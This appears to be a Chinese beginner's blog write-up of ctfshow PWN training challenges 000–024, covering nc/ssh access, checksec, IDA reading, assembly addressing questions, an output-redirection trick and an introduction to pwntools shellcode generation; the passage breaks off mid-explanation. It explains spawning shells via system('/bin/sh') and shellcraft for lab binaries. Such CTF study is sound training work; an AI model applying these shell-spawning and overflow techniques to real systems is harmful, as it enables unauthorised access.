[{"content":"[TOC]\n**前文：以下是我ctfshow的PWN做题记录，欢迎各位前来观看，小弟领教！**还有就是ctfshow-pwn是我入门PWN的第一套题，比较基础，看官方writeup可以知道比较简洁，但有些我看不懂，这是我自己做的过程中写的，都是发自内心理解它们的话，有些可能比较啰嗦，但也必须这样，因为站在新手角度来看必须要这种啰嗦方式去理解才能更深刻，有耐心的朋友可以一直看下去，当然也欢迎PWN大佬前来挑战我！！！😄\nTest_your_nc PWN_000 专用虚拟机镜像，全套在这里，提取码show；虚拟机镜像，用户名为ctfshow，密码是ctfshow。\n看了课也啥都不会或者工具不会下看这\u0026ndash;\u0026gt;CTF Wiki-PWN\n解题过程 ssh连接（记得给虚拟机kali\\Ubuntu或者主机设置打开SSH）：\nssh ctfshow@pwn.challenge.ctf.show -pxxxx\n一开始会让你输入yes/no的，直接yes，然后输入密码，等进程结束会有个交互shell\n用命令ls打开看一下有啥文件，看到有个ctfshow_flag的文件，猜是个装flag的文件夹，直接用cat命令打开就好。注意斜杠/。\nPWN_001 题目 PWN_001 ：提供后门函数，连上即可得到flag\n这里有用到“nc”连接，可以了解一下，方便后续做题。当然Kali自带nc连接的，你用Kali干PWN也行。\n这题送分的，nc连接一下就爆flag了。\n不过说实话我是真不知道PWN_001文件给来干嘛的，直接nc交互一下就出flag了，这题没搞懂ctfshow意图在哪。\n不过我用了下刚学的指令checksec看了看ELF文件信息，发现是没开canary保护的，可以利用栈溢出漏洞\u0026hellip;\n可以看到是64位仅关闭Canary保护。\n接着用64位IDA打开查看main函数（按F5进入反汇编）：\n怪不得直接爆flag出来呢。后门system函数直接运行了。\nPWN_002 题目： PWN_002 给你一个shell，这次需要你自己去获得flag\n到这里度过新手期了。\n这里需要我们输入指令了，一般来说做题习惯看到这样直接ls秒的，不过像我这样入门级别的还得用IDA琢磨琢磨：\n可以看到是没canary保护的\n看到这里有个疑问，为什么system有这么大威力？，这次system里边是一个/bin/sh的软链接，很类似我们的文件地址\nsystem(\u0026quot;/bin/sh\u0026quot;); 是漏洞利用中获取系统 shell 的核心操作，其工作原理涉及函数调用、系统调用和进程创建三个层次，本质是通过标准库函数 system 启动一个 /bin/sh 进程（即命令行解释器），让攻击者获得交互权限。\nsystem 是 C 标准库（libc）中的函数，原型为：\n1 int system(const char *command); 它的功能是执行参数 command 指向的字符串作为系统命令，相当于在终端中输入该命令并执行。\nsystem()函数先fork一个子进程，在这个子进程中调用/bin/sh -c来执行command指定的命令。/bin/sh在系统中一般是个软链接，指向dash或者bash等常用的shell，-c选项是告诉shell从字符串command中读取要执行的命令（shell将扩展command中的任何特殊字符）。父进程则调用waitpid()函数来为变成僵尸的子进程收尸，获得其结束状态，然后将这个结束状态返回给system()函数的调用者。\nsystem(\u0026quot;/bin/sh\u0026quot;) 的工作原理可简化为： 通过 system 函数创建子进程 → 子进程执行 /bin/sh 程序 → 启动交互式 shell 环境。\n这也是漏洞利用中最常用的获取权限的方式 —— 无论通过栈溢出、ROP 还是 ret2libc，最终目标都是让程序执行这条语句（或等效的系统调用）。\nPWN_003 题目： PWN_003 哪一个函数才能读取flag？\n通过前面的分析，我们可以很明显的看出来选项”6”为我们所需要的后门函数，其他的均不会得到我们所想要的flag，在system函数里面的命令都是在终端执行的，赋予system权限较大，在我所写的文章里，包括PWN入门知识讲解和操作系统都明确指出SYSTEM是与操作系统内核接触的，比Administrators的权限还要稍大。\n直接选6秒了，但除这种送分的，其实还需要搞清运行的逻辑：\n跟进一下menu函数里边：\n回到main跟进一下这个“6”的函数，看看里头是不是真在执行system后门函数：\n可以看到，确实是执行了。那么我们也就能得到我们需要的flag。\nPWN_004 题目： PWN_004 或许需要先得到某个神秘字符\n真够阴间的，啥也不给了，才第几道啊就上强度了。\nchecksec看看，然后IDA反编译看看：\n64位二进制保护全开\u0026hellip;\n可以看到有几个似曾相识的函数：strcpy（复制函数把xx复制给s1，也可起到赋值的作用）、strcmp（比较函数，对比，判断作用）、execve（）；我曾说过汇编语言的cmp就有比较作用，这也算是类比吧，回想起来的，不过用AI搜一下也行。\n来说下execve吧，上题讲过system函数，这个也应该知道的：\nexecve 是 Unix/Linux 系统中最核心的系统调用（system call） 之一，用于在当前进程中加载并执行一个新的程序，替换当前进程的代码、数据和堆栈，实现进程 “变身”。它是所有程序启动和替换的底层基础，包括 system 函数、shell 执行命令等最终都会依赖 execve 完成。\n看到这段代码，大致意思是，让s1等于“CTFshowPWN”这段字符串，然后到if判断语句这进行比较：如果s1和s2相等（这里的！不是我们C语言中的“不”的意思啊），就执行execve函数，启动交互权限，从而得到flag。\n至此：下一节就开始前置基础了，开始应用PWN-1、PWN-2、PWN-3所学的知识了。\n前置基础 PWN_005 题目：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。\n如：运行文件后 输出的内容为 Hello_World\n提交的flag值为：ctfshow{Hello_World}\n注：计组原理题型后续的flag中地址字母大写\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\nWelcome_to_CTFshow.asm文本打开后发现是汇编语言文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 section .data msg db \u0026#34;Welcome_to_CTFshow_PWN\u0026#34;, 0 section .text global _start _start: ; 立即寻址方式 mov eax, 11 ; 将11赋值给eax add eax, 114504 ; eax加上114504 sub eax, 1 ; eax减去1 ; 寄存器寻址方式 mov ebx, 0x36d ; 将0x36d赋值给ebx mov edx, ebx ; 将ebx的值赋值给edx ; 直接寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx ; 寄存器间接寻址方式 mov esi, msg ; 将msg的地址赋值给esi mov eax, [esi] ; 将esi所指向的地址的值赋值给eax ; 寄存器相对寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx add ecx, 4 ; 将ecx加上4 mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax ; 基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 2 ; 将2赋值给edx mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax ; 相对基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 1 ; 将1赋值给edx add ecx, 8 ; 将ecx加上8 mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax ; 输出字符串 mov eax, 4 ; 系统调用号4代表输出字符串 mov ebx, 1 ; 文件描述符1代表标准输出 mov ecx, msg ; 要输出的字符串的地址 mov edx, 22 ; 要输出的字符串的长度 int 0x80 ; 调用系统调用 ; 退出程序 mov eax, 1 ; 系统调用号1代表退出程序 xor ebx, ebx ; 返回值为0 int 0x80 ; 调用系统调用 checksec一下这个PWN文件：\nohoh这个保护全关的！IDA的x32位\n这个没main函数，那我们回看那段汇编语言asm，这段汇编语言更像是在帮助我们了解汇编语言的逻辑语法规则的，在PWN-1文章中就有讲过汇编语言，这里就直接跳过详解\n这题开始就有点变样了，“Welcome_to_CTFshow.asm”这文件是一个存放汇编语言的文本文件，需要运行一下转换成像exe这样的可执行文件，在PWN-1讲过elf文件：\n将汇编语言（.asm）文件转换为可执行文件，需要经过汇编（Assemble） 和链接（Link） 两个核心步骤.\n在Kali/Linux上下载nasm编辑器：\n1 sudo apt install nasm 然后下载ld链接器（通常自带）：\n1 sudo apt update \u0026amp;\u0026amp; sudo apt install binutils 汇编转换：将 .asm 转换为目标文件（.obj 或 .o）\n1 nasm -f elf Welcome_to_CTFshow.asm 汇编生成可执行文件：\n1 ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o （Welcome_to_CTFshow1是可执行文件）\n我的建议汇编转换和生成可执行文件的过程都在Kali/Linux/Ubuntu上，比较方便，windows下载比较麻烦。\n生成这个可执行文件之后，直接运行就能得到输出结果了，按照题目要求，加个{}包皮去提交就好了。\nPWN_006 题目：立即寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n按照PWN-005那样去转换生成这个可执行文件\n汇编转换：将 .asm 转换为目标文件（.obj 或 .o）\n1 nasm -f elf Welcome_to_CTFshow.asm 汇编生成可执行文件：\n1 ld -m elf_i386 -s -o Welcome_to_CTFshow1 Welcome_to_CTFshow.o （Welcome_to_CTFshow1是可执行文件）\nWelcome_to_CTFshow_PWN???是flag，错了，题目是立即寻址方式结束后eax寄存器的值为？\n那就是得把这个转换出的可执行文件放到IDA上，不过之前记得checksec一下看看是x32还是x64位哦\u0026hellip;\n1 2 3 4 ; 立即寻址方式 mov eax, 11 ; 将11赋值给eax add eax, 114504 ; eax加上114504 sub eax, 1 ; eax减去1 那就加减法咯：11+114504-1=114514\nctfshow{114514}\nPWN_007 题目：寄存器寻址方式结束后edx寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n按照上述方法去得出可执行文件，放入IDA：\n1 2 3 ; 寄存器寻址方式 mov ebx, 0x36d ; 将0x36d赋值给ebx mov edx, ebx ; 将ebx的值赋值给edx 所以ctfshow{0x36D}\nPWN_008 题目：直接寻址方式结束后ecx寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 ; 直接寻址方式 mov ecx, [msg] ; 将msg的地址赋值给ecx 当你编译后发现找不到地址[msg]，然后我们倒回来找题目的Welcome_to_CTFshow文件，用IDA：\n故flag:ctfshow{0x80490E8}\n其实不用去进行编译的，在题目给的文件就能做，编译出来的其实就是题目给的文件。\nPWN_009 题目：寄存器间接寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 ; 寄存器间接寻址方式 mov esi, msg ; 将msg的地址赋值给esi mov eax, [esi] ; 将esi所指向的地址的值赋值给eax 不是80490E8哈别被误导了，这是虚拟地址哦\n点击跟进：\ndd 636C6557h：dd 是汇编指令中的伪操作符，意为 “定义双字（define double word）”，表示在当前地址处存放一个 4 字节的数值。这里存放的数值是 636C6557h（十六进制）。\nflag:ctfshow{0x636C6557}\nPWN_010 题目：寄存器相对寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 4 ; 寄存器相对寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx add ecx, 4 ; 将ecx加上4 mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax 然后我们跟进看一下地址：\n也就是这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax\n4是十进制的，地址是16进制的，记得转换一下：\nhex(0x80490E8+4)\u0026ndash;\u0026gt; 080490EC\n对应地址得值是ome_to_CTFshow_PWN\n故flag:ctfshow{ome_to_CTFshow_PWN}\nPWN_011 题目：基址变址寻址方式结束后的eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 4 ; 基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 2 ; 将2赋值给edx mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax 同样的，放到IDA上找这个基址变址寻址方式：\n双击点dword去跟进到地址：\n计算最终也是 [0x80490E8 + 2*2 ] = [0X80490EC]\n其实也是和PWN_010一样：hex(0x80490E8+4)\n就是说hex(0x80490E8 + 2*2 )=0X80490EC，对应的是“ome_to_CTFshow_PWN”。\nflag：ctfshow{ome_to_CTFshow_PWN}\nPWN_012 题目：相对基址变址寻址方式结束后eax寄存器的值为？\nWelcome_to_CTFshow\nWelcome_to_CTFshow.asm\n1 2 3 4 5 ; 相对基址变址寻址方式 mov ecx, msg ; 将msg的地址赋值给ecx mov edx, 1 ; 将1赋值给edx add ecx, 8 ; 将ecx加上8 mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax 跟进offset dword_80490E8：\n那就是：[8 + 0x80490E8 + 1*2 - 6] = [0x80490EC]\n故flag:ctfshow{ome_to_CTFshow_PWN}\nPWN_013 题目：如何使用GCC？编译运行后即可获得flag PWN_013.c\n学过C语言都会安装配置编译器环境的，我这里使用的是visual-studio-code。\n这段代码是一个简单的 C 程序，它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来。\n在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串。\n运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符）， printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。根据给定的整数值数组，还原出的字符串为： ctfshow{hOw_t0_us3_GCC?} 。\nPWN_014 题目：请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag。 PWN_014.c\n这个文件有强度了，直接编译运行会说nothing is here，不给flag，先读一下这个C语言文件在干什么的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 int main() { FILE *fp; // 文件指针，用于操作文件 unsigned char buffer[BUFFER_SIZE]; // 缓冲区，存储从文件读取的二进制数据 size_t n; // 记录每次实际读取的字节数 fp = fopen(\u0026#34;key\u0026#34;, \u0026#34;rb\u0026#34;); // 以二进制只读方式打开名为 \u0026#34;key\u0026#34; 的文件 // 检查文件是否成功打开 if (fp == NULL) { perror(\u0026#34;Nothing here!\u0026#34;); // 若打开失败，打印错误信息 return -1; } // 输出缓冲区：大小为 BUFFER_SIZE*9 + 12（预留足够空间存储二进制字符串和分隔符） char output[BUFFER_SIZE * 9 + 12]; int offset = 0; // 记录 output 中当前已使用的位置（偏移量） // 先在 output 开头写入 \u0026#34;ctfshow{\u0026#34; offset += sprintf(output + offset, \u0026#34;ctfshow{\u0026#34;); // 循环读取文件内容：每次最多读 BUFFER_SIZE 字节，直到文件结束 while ((n = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, fp)) \u0026gt; 0) { // 遍历本次读取的每个字节 for (size_t i = 0; i \u0026lt; n; i++) { // 将当前字节拆分为 8 位二进制（从高位到低位） for (int j = 7; j \u0026gt;= 0; j--) { // (buffer[i] \u0026gt;\u0026gt; j) \u0026amp; 1：获取第 j 位（0 或 1），并写入 output offset += sprintf(output + offset, \u0026#34;%d\u0026#34;, (buffer[i] \u0026gt;\u0026gt; j) \u0026amp; 1); } // 除了最后一个字节，每个字节的二进制后加下划线 \u0026#34;_\u0026#34; if (i != n - 1) { offset += sprintf(output + offset, \u0026#34;_\u0026#34;); } } // 若未到文件末尾，在本次缓冲区数据后加空格 \u0026#34; \u0026#34;（分隔不同批次的读取） if (!feof(fp)) { offset += sprintf(output + offset, \u0026#34; \u0026#34;); } } // 在 output 末尾写入 \u0026#34;}\u0026#34;，完成格式包裹 offset += sprintf(output + offset, \u0026#34;}\u0026#34;); // 打印最终生成的字符串 printf(\u0026#34;%s\\n\u0026#34;, output); fclose(fp); // 关闭文件 return 0; } 也就是说我们需要一个名为key的文件，让这个程序知道，然后他就能把flag字符串吐出来了。\n1 $ echo \u0026#34;CTFshow\u0026#34;\u0026gt; key #创建一个名为key得文件，向内输入“CTFshow”的字符串 答案是ctfshow{01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010}\n题目要求在key里加CTFshow字符串，加其它是错的，输出结果不同。\nPWN_015 题目：编译汇编代码到可执行文件，即可拿到flag。 flag.asm\n汇编转换：将 .asm 转换为目标文件（.obj 或 .o）\n1 nasm -f elf flag.asm 汇编生成可执行文件：\n1 ld -m elf_i386 -s -o flag1 flag.o （flag1是可执行文件）\n比较简单，和PWN_005很类似，都是汇编语言编译运行之类的。\nctfshow{@ss3mb1y_1s_3@sy}\nPWN_016 题目：使用gcc将其编译为可执行文件。 flag.s\n1 gcc flag.s -o flag 可以使用 gcc 命令直接编译汇编语言源文件（ .s 文件）并将其链接为可执行文件。 gcc 命令具有适用于多种语言的编译器驱动程序功能，它可以根据输入文件的扩展名自动选择适当的编译器和链接器。\n故flag：ctfshow{daniuniuda}\nPWN_017 题目：有些命令好像有点不一样？不要一直等，可能那样永远也等不到flag。\n比较奇葩的是，这里选择3的话，一直在loading的，可能是不通的，我换到主机的nc也不行，那就是选2进程的\n选了2后，程序开始发癫了\u0026hellip;.，一直循环搞得我Kali虚拟机卡死了，进到IDAx64去看：\n这个case2的read函数只读取10字节以内的，也就是说ctfshow_flag（12byte）这串是超字节限制了。不过之前学了那个指令有通配符的cat ctf*（因为当你选择”ls ./“，打开全部文件后，发现只有一个ctfshow_flag时由ctf字眼的，那我们正好可以绕过超字节的限制了）\n搜索打开由ctf这串字符的文件内容：\nPWN_018 题目：仔细看看源码，或许有惊喜；假作真时真亦假，真作假时假亦真。 PWN_018\n连接nc后一上来就问：\n这我哪知道啊？去看IDAx64：\n分别跟进一下real和fake：\n解读一下发现一个机制：当v4不等于9时就会执行real函数，这时real会执行echo 'flag is here'\u0026gt;/ctfshow_flag，这个命令将字符串 \u0026lsquo;flag is here\u0026rsquo; 覆盖写入 /ctfshow_flag 文件中。 \u0026gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 \u0026lsquo;flag is here\u0026rsquo; 。也就是说你第一次和靶机交互时没输入9，你以后都不得不到flag了，只能重开靶机\u0026hellip;..比较CS吧\u0026hellip;\necho 'flag is here'\u0026gt;\u0026gt;/ctfshow_flag这个命令将字符串 \u0026lsquo;flag is here\u0026rsquo; 追加写入 /ctfshow_flag 文件中。 \u0026raquo; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 \u0026lsquo;flag is here\u0026rsquo; 。\n这两个命令都用于将 \u0026lsquo;flag is here\u0026rsquo; 写入 /ctfshow_flag 文件中，不同之处在于写入方式的不同。第一个命令使用追加方式，在文件末尾添加内容；第二个命令使用覆盖方式，将文件内容替换为新内容。具体使用哪个命令取决于需求和文件操作的预期结果。也就是所假的其实是我们需要的真的，真的反而是假的在远程环境中，我们需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容已经没了。\nPWN_019 题目：关闭了输出流，一定是最安全的吗？ PWN_019\n在IDA上看到，是由read和system函数的，按道理我直接cat /ctf*应该就出flag了啊\u0026hellip;\n问题就出在这个fclose函数（确实没辙了，只能用AI解释一下了）作用是关闭文件输出流，标准输出被关闭了（无法显示）。\n那还有输入流啊，可以用重定向：1\u0026gt;\u0026amp;0\n这是 Linux 的 I/O 重定向语法：\n1 代表标准输出（stdout）（正常情况下，命令的输出会送到这里，显示在终端）； 0 代表标准输入（stdin）（正常情况下，用户输入从这里读取，通常指向终端）； 1\u0026gt;\u0026amp;0 表示：将标准输出重定向到标准输入所指向的位置。 因为代码中标准输出被关闭了（无法显示），但标准输入（通常是终端）仍然可用，所以通过这个重定向，cat 命令的输出会被 “转移” 到标准输入对应的终端，从而让内容能显示出来。\n简单说就是：正常显示内容的 “输出通道” 被关了，但接收输入的 “输入通道” 还能用。通过 1\u0026gt;\u0026amp;0 把原本该从 “输出通道” 显示的内容，转到 “输入通道” 对应的终端上，这样就能看到 flag 了。ctfshow{a390a91b-5203-46ae-812d-0396de95184f}\n本质上是利用了 “输入通道和终端还连着” 这个漏洞，让内容 “借道” 显示出来～。\nPWN_020 题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}\n例如 .got可写.got.plt表可写其地址为0x400820 0x8208820\n最终flag为ctfshow{1_1_0x400820_0x8208820}\n若某个表不存在，则无需写其对应地址\n如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}\nPWN_020\nchecksec一下：\n在这里只开了NX保护。\n在PWN-1的Linux安全防护机制这一章的学习中，我们有认识到RELRO这个保护。很显然no RELRO意味着.got和.got.plt表都可写。\n用指令查表地址：\n1 readelf -S PWN_020 耐心找一下就找到了，故flag:ctfshow{1_1_0x600f18_0x600f28}\nPWN_021 题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}\n例如 .got可写.got.plt表可写其地址为0x400820 0x8208820\n最终flag为ctfshow{1_1_0x400820_0x8208820}\n若某个表不存在，则无需写其对应地址\n如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}\nPWN_021\nchecksec一下：\n要还不记得Relro保护机制原理的就回PWN-1去看吧\u0026hellip;\n这里是 GOT 表的前半部分（.got.plt）设置为只读，后半部分（.got）仍可写。\n用readelf命令去爱看表地址就好了：\nflag:ctfshow{0_1_0x600ff0_0x601000}\nPWN_021 题目：提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}\n例如 .got可写.got.plt表可写其地址为0x400820 0x8208820\n最终flag为ctfshow{1_1_0x400820_0x8208820}\n若某个表不存在，则无需写其对应地址\n如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}\nPWN_021\n道理一样checksec看relro的保护、readelf看表\u0026hellip;..\n这次就只有一个.got表了，那就是flag：ctfshow{0_0_0x600fc0}\nPWN_023 题目：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接\n1 ssh ctfshow@题目地址 -p题目端口号 不是nc连接 PWN_023\n没有canary保护，这可以是个突破点：栈溢出漏洞。\n看回IDA：\n跟进ctfshow函数\n可以知道，一开始dgets函数读取flag字符串到内存中\n跟进signal函数：\n这行代码会将内存中存储的 flag 字符串，输出到标准错误流（stderr）。因为程序启动时已经通过 fgets 从 /ctfshow_flag 文件读取了 flag 内容到 flag 变量中，所以这里能直接打印出正确的 flag。\n所以说我们让程序报错也就是让它栈溢出，覆盖后的地址还不能是有效地址，让它全部报错，也就是我们可以输入好多个a就行，几十个a的16进制地址是无效地址。\n关于栈溢出这部分，请看PWN-2详细学习，PWN板块占比也是重要的。\n逐渐开始上强度了，这时需要仔细看IDA的代码分析了，看看是什么工作原理。\nflag：ctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}\nPWN_024 题目： 你可以使用pwntools的shellcraft模块来进行攻击\nPWN_024\n我来介绍一下shellcraft模块：它是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode（这里的不同体系是我们之前学过的操作系统基础的有关shell的那一章节）有zsh、bash等。Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的Shellcode。\n生成的汇编代码可直接通过 asm() 函数转换为机器码（二进制），无需手动处理格式，例如：\n1 shellcode = asm(shellcraft.i386.sh()) # 一步完成“汇编模板→机器码”转换，类似C语言的编译器功能，转换成机器语言。 IDA：可以看到这题似乎和ret2shellcode有关\n看题目提示，进入新大陆了\u0026hellip;用pwntools了。\n这里有提示，可以看一下PWN-1-NX保护，有啥启发？\n在IDA分析可知，ctfshow函数无法跟进源代码，只能看它的伪代码去分析了（比较长）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 .text:080484C6 ; =============== S U B R O U T I N E ======================================= .text:080484C6 .text:080484C6 ; Attributes: bp-based frame .text:080484C6 .text:080484C6 ; int __cdecl ctfshow(_DWORD) .text:080484C6 public ctfshow .text:080484C6 ctfshow proc near ; CODE XREF: main+132↓p .text:080484C6 .text:080484C6 buf = byte ptr -88h .text:080484C6 var_4 = dword ptr -4 .text:080484C6 .text:080484C6 ; __unwind { .text:080484C6 push ebp .text:080484C7 mov ebp, esp .text:080484C9 push ebx .text:080484CA sub esp, 84h .text:080484D0 call __x86_get_pc_thunk_bx .text:080484D5 add ebx, (offset _GLOBAL_OFFSET_TABLE_ - $) .text:080484DB sub esp, 4 .text:080484DE push 100h ; nbytes .text:080484E3 lea eax, [ebp+buf] .text:080484E9 push eax ; buf .text:080484EA push 0 ; fd .text:080484EC call _read .text:080484F1 add esp, 10h .text:080484F4 sub esp, 0Ch .text:080484F7 lea eax, [ebp+buf] .text:080484FD push eax ; s .text:080484FE call _puts .text:08048503 add esp, 10h .text:08048506 lea eax, [ebp+buf] .text:0804850C call eax .text:0804850E nop .text:0804850F mov ebx, [ebp+var_4] .text:08048512 leave .text:08048513 retn .text:08048513 ; } // starts at 80484C6 .text:08048513 ctfshow endp .text:08048513 .text:08048514 .text:08048514 ; =============== S U B R O U T I N E ======================================= 如果之前是打逆向或者强行入门PWN的话，最坐牢的我相信应该是用IDA吧，除了找明文字符串flag外，你学了汇编语言你也看不懂这是啥意思，感觉一小串源代码转换成汇编语言非常长、枯燥，其实UP主也深有体会，在系统性入门后，也初步知道IDA是怎么用的，这里我把下划线“===== S U B R O U T I N E =====”也复制进来了，按我理解这是函数分界，分隔线上方是前一个函数的结尾（通常以retn指令结束，代表函数返回）过了这条线，说明汇编语言在描述的就是另外一个函数了。也就是说这上下分界线是代表囊括着一个函数，例如这ctfshow函数。\n另外我想说的是汇编语言这么长是有道理的，它更像是一种“啰嗦”，它能在每一段代码运行后不断向你汇报地址变化，这种 “啰嗦” 本质上是对计算机底层操作的直接映射，这种特性确实让它在跟踪程序运行细节、分析逻辑和排查问题时具有独特优势。\n从这里开始就要用pwntools了，这里介绍一下：\nfrom pwn import * 是在 Python 中使用 pwntools 库的常见导入方式 。pwntools 是一个功能强大的用于二进制漏洞利用（binary exploitation）的 Python 库，在 CTF（Capture The Flag，夺旗赛 ）竞赛、安全研究以及漏洞分析等领域广泛应用，以下是其具体作用：\n与目标程序交互 本地进程交互：pwntools 能轻松创建本地进程，模拟用户输入、获取程序输出。例如，p = process('./vulnerable_program') 可以启动本地的可执行文件 vulnerable_program，然后通过 p.sendline('input data') 向程序发送数据，用 p.recvuntil('prompt') 接收程序输出直到遇到特定字符串。 远程服务器交互：在面对远程存在漏洞的服务时，pwntools 提供了便捷的方法。比如 r = remote('target.com', 8080) 可以连接到 target.com 服务器的 8080 端口，后续同样能发送和接收数据，方便对远程服务进行测试和漏洞利用。 二进制数据处理 数据打包和解包：在二进制程序中，经常需要处理不同字节序（大端序、小端序）的数据。pwntools 提供了 pack 和 unpack 函数，比如 p32(0x12345678) 可以将整数 0x12345678 按照小端序打包成 4 字节的二进制数据；u32(data) 则可以将 4 字节的二进制数据按照小端序解包为整数。 数据转换：它还支持各种数据格式之间的转换，如将字符串转换为字节串，或者进行十六进制与二进制数据之间的转换等。 辅助漏洞利用 生成 Payload：对于缓冲区溢出等漏洞，需要精心构造 Payload（攻击载荷）。pwntools 提供了生成填充数据、构造 ROP（Return-Oriented Programming，返回导向编程 ）链等功能。比如 cyclic(100) 可以生成一个 100 字节的循环模式字符串，用于确定缓冲区溢出的偏移量；通过 ROP 模块可以方便地构建 ROP 链来绕过一些安全机制，实现代码执行。 符号解析：在分析二进制程序时，有时需要解析程序中的函数地址、变量地址等。pwntools 可以与 ELF（Executable and Linkable Format，可执行与可链接格式，常用于 Linux 系统中的可执行文件、共享库等 ）文件交互，获取这些符号信息，例如 elf = ELF('./target_binary') 可以加载目标二进制文件，然后通过 elf.symbols['main'] 获取 main 函数的地址。 密码学相关辅助 在 CTF 中，有时会涉及密码学题目，pwntools 也提供了一些基础的密码学辅助功能，比如常见加密算法的简单实现、编码解码等。\n多线程和异步支持 pwntools 一定程度上支持多线程和异步操作，这在同时与多个目标程序交互，或者需要在等待程序输出的同时执行其他任务时非常有用。\n所以为啥要学Python，当然能用豆包、DeepSeek之类的AI帮你写代码exp，但你得先了解Python再让它写才对的，有时会出错，你得有判断力。\n这里推荐使用Pycharm、Visual Studio Code；或者你可以在Kali上用终端来运行，这样你在Kali用nc连接靶机时在同一系统运行交互比较方便，当然Pycharm、Visual Studio Code也有终端功能，只不过要配PWN环境稍微麻烦而已，看你习不习惯用Linux系统吧。\n题目后续： 讲得比较啰嗦，这里开始分析这段汇编代码（重新粘贴了一遍，和上面一样）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 .text:080484C6 ; =============== S U B R O U T I N E ======================================= .text:080484C6 .text:080484C6 ; Attributes: bp-based frame .text:080484C6 .text:080484C6 ; int __cdecl ctfshow(_DWORD) .text:080484C6 public ctfshow .text:080484C6 ctfshow proc near ; CODE XREF: main+132↓p .text:080484C6 .text:080484C6 buf = byte ptr -88h .text:080484C6 var_4 = dword ptr -4 .text:080484C6 .text:080484C6 ; __unwind { .text:080484C6 push ebp .text:080484C7 mov ebp, esp .text:080484C9 push ebx .text:080484CA sub esp, 84h .text:080484D0 call __x86_get_pc_thunk_bx .text:080484D5 add ebx, (offset _GLOBAL_OFFSET_TABLE_ - $) .text:080484DB sub esp, 4 .text:080484DE push 100h ; nbytes .text:080484E3 lea eax, [ebp+buf] .text:080484E9 push eax ; buf .text:080484EA push 0 ; fd .text:080484EC call _read .text:080484F1 add esp, 10h .text:080484F4 sub esp, 0Ch .text:080484F7 lea eax, [ebp+buf] .text:080484FD push eax ; s .text:080484FE call _puts .text:08048503 add esp, 10h .text:08048506 lea eax, [ebp+buf] .text:0804850C call eax .text:0804850E nop .text:0804850F mov ebx, [ebp+var_4] .text:08048512 leave .text:08048513 retn .text:08048513 ; } // starts at 80484C6 .text:08048513 ctfshow endp .text:08048513 .text:08048514 .text:08048514 ; =============== S U B R O U T I N E ======================================= 这代码是在看不懂可以上AI嗦一下，让它帮你解析一下，毕竟刚入门\u0026hellip;\u0026hellip;（这段代码是 IDA 反编译出的 32 位 x86 